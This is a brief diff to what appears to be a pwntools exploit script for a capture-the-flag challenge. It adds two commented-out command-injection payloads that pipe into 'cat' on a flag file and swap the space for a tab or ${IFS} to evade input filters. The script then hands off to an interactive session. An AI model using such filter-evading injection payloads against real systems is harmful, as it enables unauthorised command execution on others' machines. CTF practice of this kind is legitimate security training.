@@ -87,5 +87,7 @@ io.recv(timeout=1)
 
 #io.sendline(b'COMMAND')
 #io.recv(timeout=1)
+#io.sendline(b'whoami|cat\tflag')
+#io.sendline(b'whoami|cat${IFS}flag')
 
 io.interactive()
